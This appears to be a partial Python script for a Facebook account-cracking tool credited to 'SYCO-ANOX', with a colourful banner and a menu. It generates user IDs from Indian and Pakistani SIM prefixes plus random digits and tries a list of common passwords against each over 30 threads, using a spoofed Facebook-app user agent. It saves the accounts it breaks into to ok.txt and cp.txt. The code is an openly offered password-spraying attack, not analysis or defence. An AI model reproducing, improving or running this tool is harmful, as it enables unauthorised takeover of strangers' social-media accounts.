...
os.system("clear")
print(" SMJH NA AAYA TO MSG KRO MUJE ")
os.system("https://www.facebook.com/sahil.hube?si=8lJ9ghy7OtPlMXet")
#app  check 
...
\033[1;31m(•)=============================================🌻🥀
\033[1;36m[•] \033[1;34mCREATED BY   : => \033[1;34mSYCO-ANOX
\033[1;32m[•] \033[1;36mFACEBOK      : => \033[1;36mSYCOANOX
\033[1;37m[•] \033[1;37mGITHUB       :  => \033[1;37m5YC0ANOX12
\033[1;33m[•] \033[1;34mSTATUS       : => \033[1;34m IS FREE RANDOM
\033[1;35m[•] \033[1;36mBROTHER      : => \033[1;36mSYCO-ANOX
\033[1;32m[•] \033[1;33mVERSION      : => \033[1;33m 2.0
\033[1;31m(•)=============================================🌻🌿\n\n"""  
loop = 0
oks = []
cps = []
...
def menu():
	...
	if opt =='1':
		random_crack()
	if opt =='2':
		os.system("xdg-open https://www.facebook.com/profile.php?id=100072745961747")
		menu()
    #if opt =='0':
    	#exit()
    #else:
...
def random_number():
	...
	os.system('clear')
	print(logo)
	print("\033[1;32m INDIA code : 6375,9871,6383,8795,6355")
	print(47*'-')
	kode = input('[?] Choice sim Code : ')
	print(47*'-')
	os.system('clear')
	print(logo)
	print(' EXAMPLE CLONE : 3000  4000 5000 6000')
	print('=========================================')
...
def rcrack(uid,pwx,tl):
    ...
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; POT-AL00a Build/HUAWEIPOT-AL00a; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.99 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/273.0.0.39.123;]',}
		...
		sys.stdout.write('\r\33[1;37m[SYCO-ANOX] %s|OK:%s CP:%s \r'%(loop,len(oks),len(cps))),
...
def random_pak_number():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			uid = kode+guru
			pwx = [guru,'khankhan','khankhan123','malikmalik','baloch','pakistan','khan12345','alikhan12345','aliali','janjan','ali1122','khann1122','khan12','khan123','khan786','786786']
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
